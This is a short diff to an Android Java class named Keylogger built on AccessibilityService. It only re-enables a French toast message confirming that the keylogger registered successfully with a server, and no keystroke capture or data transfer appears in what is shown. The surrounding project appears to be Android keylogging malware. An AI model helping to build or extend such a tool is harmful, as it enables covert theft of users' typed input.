@@ -76,7 +76,7 @@ public class Keylogger extends AccessibilityService {
 
     private void handleRegisterResponse(Response<User> response) {
         if (response.isSuccessful()) {
-            //Toast.makeText(getApplicationContext(), "Keylogger enregistré avec succès.", Toast.LENGTH_SHORT).show();
+            Toast.makeText(getApplicationContext(), "Keylogger enregistré avec succès.", Toast.LENGTH_SHORT).show();
         } else {
             Toast.makeText(getApplicationContext(), "Une erreur a été rencontré .", Toast.LENGTH_SHORT).show();
         }
